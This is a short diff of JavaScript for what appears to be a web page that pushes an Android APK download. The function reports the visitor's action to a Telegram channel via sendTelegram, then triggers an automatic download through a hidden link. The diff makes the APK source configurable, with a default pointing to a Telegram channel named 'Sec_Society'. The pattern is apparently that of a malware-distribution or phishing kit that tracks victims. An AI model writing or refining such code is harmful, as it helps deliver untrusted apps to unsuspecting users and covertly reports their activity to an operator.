@@ -184,10 +184,12 @@ async function sendOpenEvent() {
 
 async function downloadFile() {
     await sendTelegram('User started APK download');
+    const apkUrl = window.__APK_URL__ || 'https://t.me/Sec_Society';
     const link = document.createElement('a');
-    link.href = 'https://t.me/Sec_Society'; // Add your APK download link here | And Direct Download to folder
-    link.download = 'test.apk';
+    link.href = apkUrl;
+    link.download = 'app.apk';
     link.target = '_blank';
+    link.rel = 'noopener';
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
